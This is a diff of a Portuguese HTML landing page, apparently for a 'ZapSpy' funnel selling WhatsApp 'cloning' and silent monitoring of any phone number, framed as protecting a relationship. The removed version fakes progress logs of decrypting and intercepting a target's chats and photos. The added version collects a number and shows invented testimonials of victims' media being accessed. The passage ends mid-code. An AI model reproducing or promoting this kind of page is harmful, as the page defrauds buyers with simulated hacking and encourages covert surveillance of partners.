@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp - Processando...</title>
+    <title>WhatsApp - Número</title>
 
     <script
         src="https://cdn.utmify.com.br/scripts/utms/latest.js"
@@ -21,361 +21,370 @@
         a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
         document.head.appendChild(a);
     </script>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" data-utmify-ignore-iframe="" async="" defer=""></script>
+    <script src="js/core.js" defer></script> 
+
     <style>
         :root {
             --primary-green: #25D366;
+            --light-green: #dcf8c6;
             --dark-green: #128C7E;
-            --bg-color: #f0f2f5;
+            --background-color: #f5f5f1;
+            --text-dark: #2c3e50;
+            --text-light: #7f8c8d;
             --white: #ffffff;
-            --text-main: #111b21;
-            --text-sec: #667781;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         
         body {
-            background-color: var(--bg-color);
-            color: var(--text-main);
-            display: flex;
-            flex-direction: column;
-            min-height: 100vh;
+            background-color: var(--background-color);
+            color: var(--text-dark);
+            line-height: 1.6;
         }
 
-        /* HEADER */
-        header {
-            background-color: var(--bg-color);
-            padding: 15px 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border-bottom: 1px solid #e9edef;
-        }
+        /* Header */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 16px 24px; background-color: var(--background-color); border-bottom: 1px solid rgba(0, 0, 0, 0.05); }
+        .menu-button { background: none; border: none; cursor: pointer; padding: 8px; }
+        .menu-button svg { width: 24px; height: 24px; fill: var(--text-dark); }
+        .logo { display: flex; align-items: center; justify-content: center; }
+        .logo svg { height: 31px; }
+        .download-button { background-color: var(--primary-green); border: 1px solid #000000; border-radius: 50%; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: background-color 0.3s; }
+        .download-button:hover { background-color: var(--dark-green); }
+        .download-button svg { width: 24px; height: 24px; fill: var(--white); }
+
+        /* Main Content */
+        .container { width: 100%; max-width: 600px; margin: 0 auto; padding: 10px 20px; }
+        .main-content { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px 0; }
+        .title { font-size: 2.2rem; margin-bottom: 15px; color: #000000; font-weight: 700; }
+        .subtitle { font-size: 1.2rem; margin-bottom: 30px; color: var(--text-dark); max-width: 500px; }
+        .form-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; gap: 20px; }
+        .input-group { position: relative; width: 100%; }
+        .phone-input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 10px; font-size: 1.1rem; transition: border-color 0.3s, box-shadow 0.3s; outline: none; }
+        .phone-input:focus { border-color: var(--primary-green); box-shadow: 0 0 0 2px rgba(37, 211, 102, 0.2); }
         
-        .logo svg { height: 28px; }
-        .icon-btn svg { width: 24px; height: 24px; fill: var(--text-sec); }
+        .clone-button { background-color: var(--primary-green); color: white; border: 1px solid #000000; border-radius: 10px; padding: 15px 20px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 10px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); opacity: 0.7; pointer-events: none; }
+        .clone-button.active { opacity: 1; pointer-events: all; animation: pulse 1.5s infinite; }
+        .clone-button.active:hover { background-color: var(--dark-green); transform: translateY(-2px); box-shadow: 0 6px 8px rgba(0, 0, 0, 0.15); }
+        .clone-button svg { width: 20px; height: 20px; fill: white; }
 
-        /* CONTAINER PRINCIPAL */
-        .main-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            width: 100%;
-            max-width: 500px;
-            margin: 0 auto;
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(37, 211, 102, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
         }
 
-        h1.title {
-            font-size: 20px;
-            color: var(--text-main);
-            margin-bottom: 10px;
-            font-weight: 600;
-            text-align: center;
-        }
+        .social-proof { margin-top: 30px; width: 100%; max-width: 400px; }
+        .proof-item { background-color: var(--light-green); border-radius: 10px; padding: 12px 15px; margin-bottom: 10px; text-align: left; display: flex; align-items: center; opacity: 0; transform: translateY(10px); transition: opacity 0.5s ease, transform 0.5s ease; }
+        .proof-item.show { opacity: 1; transform: translateY(0); }
+        .proof-icon { background-color: var(--primary-green); width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; flex-shrink: 0; }
+        .proof-icon svg { width: 18px; height: 18px; fill: white; }
+        .proof-text { font-size: 0.95rem; color: var(--text-dark); }
 
-        p.subtitle {
-            font-size: 14px;
-            color: var(--text-sec);
-            text-align: center;
-            margin-bottom: 30px;
-        }
+        footer { background-color: var(--white); padding: 30px 0; margin-top: auto; border-top: 1px solid rgba(0, 0, 0, 0.05); }
+        .footer-content { display: flex; flex-direction: column; align-items: center; gap: 15px; }
+        .footer-links { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; }
+        .footer-links a { color: var(--text-light); text-decoration: none; font-size: 14px; transition: color 0.3s; }
+        .footer-links a:hover { color: var(--primary-green); }
+        .copyright { font-size: 12px; color: var(--text-light); margin-top: 10px; }
 
-        /* CARD DE CARREGAMENTO */
-        .card {
-            background: var(--white);
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-            width: 100%;
-            text-align: center;
-            transition: all 0.3s ease;
-        }
+        .cookie-notice { position: fixed; bottom: 0; left: 0; width: 100%; background-color: var(--white); padding: 15px; text-align: center; box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1); z-index: 1000; display: flex; justify-content: center; align-items: center; flex-wrap: wrap; gap: 15px; }
+        .cookie-notice p { margin: 0; font-size: 14px; }
+        .cookie-notice button { background-color: var(--primary-green); color: var(--white); border: 1px solid #000000; border-radius: 20px; padding: 8px 20px; cursor: pointer; font-weight: 600; transition: background-color 0.3s; }
+        .cookie-notice button:hover { background-color: var(--dark-green); }
 
-        /* ANIMAÇÃO DE SPINNER */
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(37, 211, 102, 0.2);
-            border-left-color: var(--primary-green);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
-        /* BARRA DE PROGRESSO */
-        .progress-wrapper {
-            background: #e9edef;
-            height: 8px;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 10px;
-        }
-        .progress-bar {
-            height: 100%;
-            background: var(--primary-green);
-            width: 0%;
-            transition: width 0.3s ease;
-        }
-        .progress-status {
-            font-size: 13px;
-            color: var(--text-sec);
-            margin-bottom: 20px;
-        }
-
-        /* LOGS DE CONEXÃO */
-        .log-box {
-            background: #f0f2f5;
-            border-radius: 8px;
-            padding: 10px;
-            height: 150px;
-            overflow-y: auto;
-            text-align: left;
-            font-size: 12px;
-            font-family: monospace;
-            border: 1px solid #e0e0e0;
-        }
-        .log-item {
-            margin-bottom: 5px;
-            opacity: 0;
-            transform: translateY(5px);
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-        .log-item.show { opacity: 1; transform: translateY(0); }
-        .log-item svg { width: 12px; height: 12px; flex-shrink: 0; }
-        .log-success { color: #0f9d58; }
-        .log-warning { color: #f4b400; }
-
-        /* PERFIL ENCONTRADO (Escondido inicialmente) */
-        .profile-wrapper {
-            display: none; /* JS vai mudar para flex */
-            flex-direction: column;
-            align-items: center;
-            width: 100%;
-            animation: fadeIn 0.5s ease;
-        }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-
-        .avatar-box {
-            position: relative;
-            margin-bottom: 15px;
-        }
-        .avatar {
-            width: 100px;
-            height: 100px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid var(--primary-green);
-            padding: 2px;
-            background: #fff;
-        }
-        .status-badge {
-            position: absolute;
-            bottom: 5px;
-            right: 5px;
-            background: #25D366;
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            border: 2px solid #fff;
-        }
-
-        .profile-name { font-size: 18px; font-weight: 700; color: var(--text-main); }
-        .profile-phone { font-size: 14px; color: var(--text-sec); margin-bottom: 20px; }
-
-        .data-row {
-            display: flex;
-            justify-content: space-between;
-            width: 100%;
-            padding: 12px 0;
-            border-bottom: 1px solid #f0f0f0;
-            font-size: 14px;
-        }
-        .data-row:last-of-type { border-bottom: none; margin-bottom: 20px; }
-        .data-label { color: var(--text-sec); }
-        .data-value { font-weight: 600; color: var(--text-main); }
-
-        .btn-access {
-            background-color: var(--primary-green);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 16px;
-            border-radius: 50px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3);
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            transition: transform 0.2s;
-        }
-        .btn-access:hover { transform: scale(1.02); background-color: var(--dark-green); }
-        
-        /* Footer */
-        footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 12px;
-            color: #999;
-            margin-top: auto;
+        @media (max-width: 767px) {
+            .title { font-size: 1.8rem; margin-top: 20px; }
+            .subtitle { font-size: 1rem; margin-bottom: 25px; }
+            .phone-input, .clone-button { padding: 12px 15px; font-size: 1rem; }
+            .proof-item { padding: 10px 12px; }
+            .proof-icon { width: 28px; height: 28px; }
+            .proof-text { font-size: 0.9rem; }
+            .cookie-notice { flex-direction: column; padding: 12px; }
+            .cookie-notice p { font-size: 13px; margin-bottom: 8px; }
+            .main-content { padding: 30px 15px; }
+            .footer-links { gap: 15px; }
+            .footer-links a { font-size: 13px; }
         }
     </style>
 </head>
-<body>
 
-    <header>
-        <div class="icon-btn">
-            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-        </div>
+<body>
+    <header class="header">
+        <button class="menu-button">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path></svg>
+        </button>
         <div class="logo">
-            <svg viewBox="0 0 33 33" fill="none" xmlns="http://www.w3.org/2000/svg" style="height:35px;">
-                <path d="M16.6 0C7.4 0 0 7.4 0 16.5C0 19.5 0.8 22.3 2.2 24.8L0 33L8.4 30.8C10.8 32.1 13.6 32.9 16.6 32.9C25.7 32.9 33.1 25.5 33.1 16.4C33.1 7.3 25.7 0 16.6 0Z" fill="#25D366"/>
-                <path d="M25.7 21.6C25.5 22.9 24.3 23.9 23.1 24.2C22.2 24.4 17.8 26.2 12.1 20.6C6.9 15.3 8.3 11.2 8.7 10.3C9 9.1 10.1 7.9 11.4 7.7C11.6 7.6 11.9 7.6 12.2 7.6C12.5 7.6 12.8 7.7 13 8.3C13.3 9 14 10.7 14.1 10.9C14.2 11.1 14.3 11.4 14.1 11.7C13.9 12 13.8 12.1 13.5 12.4C13.3 12.7 13 12.9 13.3 13.4C13.6 13.9 14.7 15.7 16.3 17.1C17.9 18.5 19.3 19 19.8 19.2C20.3 19.4 20.6 19.4 20.9 19.1C21.2 18.8 21.7 18.1 21.9 17.7C22.2 17.3 22.5 17.4 22.8 17.5C23.1 17.6 24.8 18.5 25.1 18.6C25.5 18.8 25.7 18.9 25.8 19.1C25.9 19.2 25.9 20.4 25.7 21.6Z" fill="white"/>
+            <svg width="131" height="31" viewBox="0 0 131 31" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M49.0664 17.9283H49.0272L46.5619 7.97656H43.5914L41.0748 17.8077H41.0341L38.7573 7.98259H35.5908L39.4102 22.4156H42.6234L45.0269 12.5921H45.0676L47.5133 22.4156H50.6662L54.5398 7.98259H51.4277L49.0664 17.9283Z" fill="#25D366"></path>
+                <path d="M64.2187 12.865C63.9149 12.478 63.5144 12.1779 63.0576 11.995C62.4546 11.7675 61.8125 11.6615 61.1683 11.6828C60.5909 11.6917 60.0233 11.8336 59.5097 12.0975C58.9237 12.3912 58.4378 12.8518 58.1134 13.4214H58.0531V7.98259H55.1882V22.4156H58.0531V16.9377C58.0531 15.8731 58.228 15.1081 58.5778 14.6427C58.9277 14.1773 59.4936 13.9451 60.2757 13.9461C60.9617 13.9461 61.4412 14.1587 61.7096 14.5839C61.978 15.0091 62.1137 15.6515 62.1137 16.514V22.4156H64.9786V15.9877C64.9831 15.3938 64.9254 14.801 64.8067 14.219C64.7135 13.7297 64.5127 13.2671 64.2187 12.865V12.865Z" fill="#25D366"></path>
+                <path d="M30.3139 14.8011C30.1739 10.9697 28.5594 7.34056 25.8073 4.67136C23.0552 2.00216 19.3784 0.499287 15.5446 0.476567H15.4722C12.8904 0.474649 10.3527 1.14494 8.10857 2.42148C5.86449 3.69802 3.99142 5.53682 2.67367 7.75695C1.35592 9.97709 0.6389 12.5021 0.593155 15.0834C0.547411 17.6648 1.17452 20.2135 2.41278 22.479L1.09794 30.3469C1.0958 30.363 1.09712 30.3794 1.10182 30.395C1.10651 30.4106 1.11448 30.425 1.12518 30.4373C1.13588 30.4496 1.14907 30.4594 1.16387 30.4662C1.17867 30.473 1.19475 30.4765 1.21103 30.4766H1.23365L9.01561 28.7456C11.0263 29.7109 13.2282 30.2118 15.4586 30.2112C15.6004 30.2112 15.7421 30.2112 15.8838 30.2112C17.8458 30.1552 19.7773 29.7112 21.5667 28.9048C23.3562 28.0984 24.9682 26.9456 26.3098 25.5129C27.6514 24.0802 28.696 22.396 29.3832 20.5574C30.0704 18.7189 30.3867 16.7625 30.3139 14.8011V14.8011Z" fill="#25D366"></path>
+                <path d="M10.2894 8.16663C10.1057 8.17022 9.92456 8.21063 9.75673 8.28548C9.5889 8.36033 9.43779 8.4681 9.31236 8.6024C8.95801 8.96579 7.96736 9.84034 7.91006 11.6769C7.85277 13.5134 9.13594 15.3304 9.31537 15.5852C9.49481 15.84 11.7686 19.8072 15.5141 21.416C17.7156 22.3645 18.6806 22.5273 19.3063 22.5273C19.5642 22.5273 19.7587 22.5002 19.9622 22.4881C20.6483 22.4459 22.1969 21.6528 22.5346 20.7903C22.8724 19.9278 22.895 19.1739 22.806 19.0231C22.7171 18.8723 22.4728 18.7637 22.1049 18.5707C21.737 18.3777 19.9321 17.4127 19.5928 17.277C19.467 17.2184 19.3316 17.1832 19.1932 17.173C19.1031 17.1777 19.0155 17.2043 18.938 17.2506C18.8605 17.2968 18.7954 17.3613 18.7484 17.4383C18.4469 17.8138 17.7548 18.6295 17.5225 18.8648C17.4718 18.9232 17.4093 18.9703 17.3392 19.0031C17.2691 19.0358 17.1928 19.0534 17.1154 19.0548C16.9728 19.0485 16.8333 19.0109 16.7068 18.9447C15.6135 18.4804 14.6167 17.8155 13.768 16.9845C12.975 16.2029 12.3022 15.3081 11.7716 14.3292C11.5666 13.9492 11.7716 13.7532 11.9586 13.5753C12.1456 13.3973 12.3461 13.1516 12.5391 12.9389C12.6975 12.7573 12.8295 12.5543 12.9312 12.3358C12.9838 12.2344 13.0104 12.1215 13.0085 12.0073C13.0067 11.893 12.9765 11.7811 12.9206 11.6814C12.8317 11.4914 12.1667 9.62321 11.8546 8.87381C11.6013 8.23298 11.2997 8.21187 11.0358 8.19227C10.8187 8.17719 10.5699 8.16965 10.3211 8.16211H10.2894" fill="#25D366"></path>
             </svg>
         </div>
-        <div class="icon-btn">
-            <svg viewBox="0 0 24 24"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/></svg>
-        </div>
+
+        <button class="download-button">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"></path></svg>
+        </button>
     </header>
 
-    <div class="main-container">
-        <div id="loadingStep" class="card">
-            <h1 class="title">Conectando...</h1>
-            <p class="subtitle">Estabelecendo conexão segura com o servidor.</p>
-            
-            <div class="spinner"></div>
-            
-            <div class="progress-wrapper">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <div class="progress-status" id="progressStatus">Iniciando protocolo... 0%</div>
+    <div class="container">
+        <main class="main-content">
+            <h1 class="title">Parabéns, você ganhou 1 acesso gratuito!</h1>
+            <p class="subtitle">Insira o número abaixo e inicie o monitoramento silencioso.</p>
 
-            <div class="log-box" id="logBox">
+            <div class="form-container">
+                <div class="input-group">
+                    <input type="tel" id="phoneInput" class="phone-input" placeholder="(99) 99999-9999" maxlength="15">
                 </div>
-        </div>
 
-        <div id="profileStep" class="card profile-wrapper">
-            <h1 class="title" style="color:#0f9d58;">Acesso Concedido!</h1>
-            <p class="subtitle">Conseguimos interceptar os dados com sucesso.</p>
+                <button id="cloneButton" class="clone-button">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path>
+                    </svg>
+                    Clonar WhatsApp Agora
+                </button>
 
-            <div class="avatar-box">
-                <img id="userAvatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ccc'%3E%3Cpath d='M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z'/%3E%3C/svg%3E" class="avatar">
-                <div class="status-badge"></div>
+                <div class="social-proof">
+                    <div class="proof-item show" id="proof1">
+                        <div class="proof-icon">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+                        </div>
+                        <span class="proof-text" id="proofText1">(94) 91059-XX08 de Ananindeua teve as fotos e vídeos acessados!</span>
+                    </div>
+                    <div class="proof-item" id="proof2">
+                        <div class="proof-icon">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+                        </div>
+                        <span class="proof-text" id="proofText2">(55) 99352-XX87 de Caxias do Sul está sob vigilância agora...</span>
+                    </div>
+                    <div class="proof-item" id="proof3">
+                        <div class="proof-icon">
+                            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path></svg>
+                        </div>
+                        <span class="proof-text" id="proofText3">(15) 94376-XX22 está sendo monitorado silenciosamente...</span>
+                    </div>
+                </div>
             </div>
-
-            <div class="profile-name" id="userName">Usuário WhatsApp</div>
-            <div class="profile-phone" id="userPhone">(XX) XXXXX-XXXX</div>
-
-            <div class="data-row">
-                <span class="data-label">Status:</span>
-                <span class="data-value" style="color: #25D366;">Online</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Localização:</span>
-                <span class="data-value" id="locationData">Buscando...</span>
-            </div>
-            <div class="data-row">
-                <span class="data-label">Mídia Recente:</span>
-                <span class="data-value">14 Fotos / 3 Vídeos</span>
-            </div>
-
-            <button onclick="redirectToReport()" class="btn-access">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-                VER CONVERSAS E FOTOS
-            </button>
-        </div>
+        </main>
     </div>
 
     <footer>
-        <p>Sistema Seguro & Criptografado &copy; 2025</p>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Política de Privacidade</a>
+                    <a href="#">Termos de Uso</a>
+                    <a href="#">Suporte por Email</a>
+                </div>
+                <p class="copyright">© 2024 Proteja Seu Relacionamento. Todos os direitos reservados.</p>
+            </div>
+        </div>
     </footer>
 
+    <div id="cookieNotice" class="cookie-notice">
+        <p>Este site utiliza cookies para melhorar sua experiência. Ao continuar, você concorda com nossa política.</p>
+        <button id="acceptCookies">Aceitar</button>
+    </div>
+
     <script>
-        // === 1. CONFIGURAÇÕES INICIAIS ===
-        const logs = [
-            "Conectando ao servidor...",
-            "Validando número de telefone...",
-            "Buscando chave de criptografia...",
-            "Chave encontrada! Descriptografando...",
-            "Acessando banco de dados de mídia...",
-            "Baixando histórico de conversas...",
-            "Fotos recentes encontradas...",
-            "Finalizando conexão segura...",
-            "Sucesso! Dados prontos para visualização."
-        ];
+        document.addEventListener('DOMContentLoaded', function () {
+            // Get URL parameters and preserve them
+            const urlParams = new URLSearchParams(window.location.search);
+            const alvoMonitoramento = localStorage.getItem('alvoMonitoramento');
 
-        // Recupera o número salvo
-        const numeroSalvo = localStorage.getItem('numeroClonado') || '(11) 99999-9999';
-        
-        // Exibe o número formatado
-        document.getElementById('userPhone').innerText = numeroSalvo;
+            // Cookie Notice
+            const cookieNotice = document.getElementById('cookieNotice');
+            const acceptCookiesBtn = document.getElementById('acceptCookies');
 
-        // === 2. FUNÇÃO DE REDIRECIONAMENTO COM UTMS ===
-        function redirectToReport() {
-            const currentUrl = new URL(window.location.href);
-            const params = currentUrl.search; // Pega ?utm_source=...
-            
-            // Redireciona para a pasta 'relatorio' mantendo os parâmetros
-            window.location.href = `/relatorio/index.html${params}`;
-        }
-
-        // === 3. SIMULAÇÃO DE PROGRESSO E LOGS ===
-        let progress = 0;
-        const progressBar = document.getElementById('progressBar');
-        const progressStatus = document.getElementById('progressStatus');
-        const logBox = document.getElementById('logBox');
-        
-        function addLog(text, type = 'normal') {
-            const div = document.createElement('div');
-            div.className = `log-item ${type === 'success' ? 'log-success' : ''}`;
-            if(type === 'warning') div.className += ' log-warning';
-            
-            let iconPath = '<path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15v-2h2v2h-2zm0-10v6h2V7h-2z"/>'; // Info
-            if(type === 'success') iconPath = '<path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>'; // Check
-            if(type === 'warning') iconPath = '<path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>'; // Alert
-
-            div.innerHTML = `<svg viewBox="0 0 24 24" fill="currentColor">${iconPath}</svg> ${text}`;
-            logBox.appendChild(div);
-            
-            setTimeout(() => div.classList.add('show'), 50);
-            logBox.scrollTop = logBox.scrollHeight;
-        }
-
-        const interval = setInterval(() => {
-            progress += Math.floor(Math.random() * 5) + 1;
-            if (progress > 100) progress = 100;
-
-            progressBar.style.width = `${progress}%`;
-            progressStatus.innerText = `Processando... ${progress}%`;
-
-            const logIndex = Math.floor((progress / 100) * logs.length);
-            if (logIndex < logs.length && Math.random() > 0.7) {
-                addLog(logs[logIndex]);
+            // Check if user already accepted cookies
+            if (localStorage.getItem('cookiesAccepted') === 'true') {
+                cookieNotice.style.display = 'none';
             }
 
-            if (progress === 100) {
-                clearInterval(interval);
-                addLog("Processo concluído!", "success");
-                setTimeout(showProfile, 1000);
+            // Handle cookie acceptance
+            acceptCookiesBtn.addEventListener('click', function () {
+                localStorage.setItem('cookiesAccepted', 'true');
+                cookieNotice.style.display = 'none';
+            });
+
+            // Phone input mask
+            const phoneInput = document.getElementById('phoneInput');
+            const cloneButton = document.getElementById('cloneButton');
+
+            phoneInput.addEventListener('input', function (e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let formattedValue = '';
+
+                if (value.length > 0) {
+                    formattedValue = '(' + value.substring(0, 2);
+                }
+
+                if (value.length > 2) {
+                    formattedValue += ') ' + value.substring(2, 7);
+                }
+
+                if (value.length > 7) {
+                    formattedValue += '-' + value.substring(7, 11);
+                }
+
+                e.target.value = formattedValue;
+
+                // Check if phone number is valid (at least 14 characters with formatting)
+                if (formattedValue.length >= 14) {
+                    cloneButton.classList.add('active');
+                } else {
+                    cloneButton.classList.remove('active');
+                }
+            });
+
+            // Handle clone button click
+            cloneButton.addEventListener('click', function () {
+                if (cloneButton.classList.contains('active')) {
+                    // Save phone number to localStorage
+                    localStorage.setItem('numeroClonado', phoneInput.value);
+
+                    // Get current URL parameters
+                    const currentUrl = new URL(window.location.href);
+                    const params = currentUrl.searchParams;
+
+                    // Isso vai jogar para https://zapspy.pages.dev/carregando
+                    // AJUSTADO PARA O CAMINHO CORRETO NA PASTA
+                    const redirectUrl = new URL('/carregando/', currentUrl.origin);
+
+                    // Copy all parameters from current URL
+                    params.forEach((value, key) => {
+                        redirectUrl.searchParams.append(key, value);
+                    });
+
+                    // Redirect to loading.html with parameters
+                    window.location.href = redirectUrl.toString();
+                }
+            });
+
+            // DDD to state mapping
+            const dddToState = { '11': 'São Paulo', '12': 'São Paulo', '13': 'São Paulo', '14': 'São Paulo', '15': 'São Paulo', '16': 'São Paulo', '17': 'São Paulo', '18': 'São Paulo', '19': 'São Paulo', '21': 'Rio de Janeiro', '22': 'Rio de Janeiro', '24': 'Rio de Janeiro', '27': 'Espírito Santo', '28': 'Espírito Santo', '31': 'Minas Gerais', '32': 'Minas Gerais', '33': 'Minas Gerais', '34': 'Minas Gerais', '35': 'Minas Gerais', '37': 'Minas Gerais', '38': 'Minas Gerais', '41': 'Paraná', '42': 'Paraná', '43': 'Paraná', '44': 'Paraná', '45': 'Paraná', '46': 'Paraná', '47': 'Santa Catarina', '48': 'Santa Catarina', '49': 'Santa Catarina', '51': 'Rio Grande do Sul', '53': 'Rio Grande do Sul', '54': 'Rio Grande do Sul', '55': 'Rio Grande do Sul', '61': 'Distrito Federal', '62': 'Goiás', '63': 'Tocantins', '64': 'Goiás', '65': 'Mato Grosso', '66': 'Mato Grosso', '67': 'Mato Grosso do Sul', '68': 'Acre', '69': 'Rondônia', '71': 'Bahia', '73': 'Bahia', '74': 'Bahia', '75': 'Bahia', '77': 'Bahia', '79': 'Sergipe', '81': 'Pernambuco', '82': 'Alagoas', '83': 'Paraíba', '84': 'Rio Grande do Norte', '85': 'Ceará', '86': 'Piauí', '87': 'Pernambuco', '88': 'Ceará', '89': 'Piauí', '91': 'Pará', '92': 'Amazonas', '93': 'Pará', '94': 'Pará', '95': 'Roraima', '96': 'Amapá', '97': 'Amazonas', '98': 'Maranhão', '99': 'Maranhão' };
+
+            // Cities by state
+            const citiesByState = { 'São Paulo': ['São Paulo', 'Campinas', 'Guarulhos', 'São Bernardo', 'Santo André', 'Ribeirão Preto', 'Osasco', 'Sorocaba'], 'Rio de Janeiro': ['Rio de Janeiro', 'Niterói', 'São Gonçalo', 'Duque de Caxias', 'Nova Iguaçu', 'Petrópolis', 'Volta Redonda'], 'Minas Gerais': ['Belo Horizonte', 'Uberlândia', 'Contagem', 'Juiz de Fora', 'Betim', 'Montes Claros', 'Uberaba'], 'Bahia': ['Salvador', 'Feira de Santana', 'Vitória da Conquista', 'Camaçari', 'Itabuna', 'Juazeiro', 'Ilhéus'], 'Paraná': ['Curitiba', 'Londrina', 'Maringá', 'Ponta Grossa', 'Cascavel', 'São José dos Pinhais', 'Foz do Iguaçu'], 'Rio Grande do Sul': ['Porto Alegre', 'Caxias do Sul', 'Pelotas', 'Canoas', 'Santa Maria', 'Gravataí', 'Viamão'], 'Pernambuco': ['Recife', 'Jaboatão', 'Olinda', 'Caruaru', 'Petrolina', 'Paulista', 'Cabo de Santo Agostinho'], 'Ceará': ['Fortaleza', 'Caucaia', 'Juazeiro do Norte', 'Maracanaú', 'Sobral', 'Crato', 'Itapipoca'], 'Pará': ['Belém', 'Ananindeua', 'Santarém', 'Marabá', 'Castanhal', 'Parauapebas', 'Abaetetuba'], 'Santa Catarina': ['Florianópolis', 'Joinville', 'Blumenau', 'São José', 'Chapecó', 'Itajaí', 'Criciúma'], 'Goiás': ['Goiânia', 'Aparecida de Goiânia', 'Anápolis', 'Rio Verde', 'Luziânia', 'Águas Lindas de Goiás', 'Valparaíso de Goiás'], 'Maranhão': ['São Luís', 'Imperatriz', 'São José de Ribamar', 'Timon', 'Caxias', 'Codó', 'Paço do Lumiar'], 'Paraíba': ['João Pessoa', 'Campina Grande', 'Santa Rita', 'Patos', 'Bayeux', 'Sousa', 'Cabedelo'], 'Amazonas': ['Manaus', 'Parintins', 'Itacoatiara', 'Manacapuru', 